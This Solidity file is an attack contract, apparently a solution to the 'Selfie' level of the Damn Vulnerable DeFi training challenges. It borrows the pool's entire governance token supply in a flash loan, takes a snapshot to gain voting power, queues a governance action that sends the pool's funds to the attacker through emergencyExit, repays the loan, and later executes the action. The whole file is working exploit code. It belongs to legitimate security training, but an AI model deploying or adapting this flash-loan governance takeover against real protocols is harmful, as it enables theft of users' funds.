// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {ERC20Snapshot} from "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {DamnValuableTokenSnapshot} from "../DamnValuableTokenSnapshot.sol";
import {SelfiePool} from "./SelfiePool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SimpleGovernanceAttack is IERC3156FlashBorrower {
    using Address for address;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    DamnValuableTokenSnapshot public governanceToken;
    SimpleGovernance public governance;
    SelfiePool public selfiePool;
    address public attacker;
    uint256 private actionId;

    constructor(address _governance, address _selfiePool) {
        governance = SimpleGovernance(_governance);
        selfiePool = SelfiePool(_selfiePool);
        governanceToken = DamnValuableTokenSnapshot(governance.getGovernanceToken());
        attacker = msg.sender;
    }

    function attack() public {
        // 1. Flash loan all DVT from selfiePool
        selfiePool.flashLoan({
            _receiver: IERC3156FlashBorrower(address(this)),
            _token: address(governanceToken),
            _amount: governanceToken.balanceOf(address(selfiePool)),
            _data: abi.encodeWithSignature(
                "receiveTokens(address,uint256)", address(governanceToken), governanceToken.balanceOf(address(selfiePool))
                )
        });
    }

    function onFlashLoan(address, address token, uint256 amount, uint256, bytes calldata) external returns (bytes32) {
        // 2. Create token snapshot
        governanceToken.snapshot();
        // 3. Queue a governance action to drain all DVT from selfiePool
        actionId = governance.queueAction({
            target: address(selfiePool),
            value: 0,
            data: abi.encodeWithSignature("emergencyExit(address)", address(attacker))
        });
        // 4. Return the flash loan
        DamnValuableTokenSnapshot(token).approve(address(selfiePool), amount);
        return CALLBACK_SUCCESS;
    }

    function attack2() public {
        // 5. Execute the governance action
        governance.executeAction(actionId);
    }
}
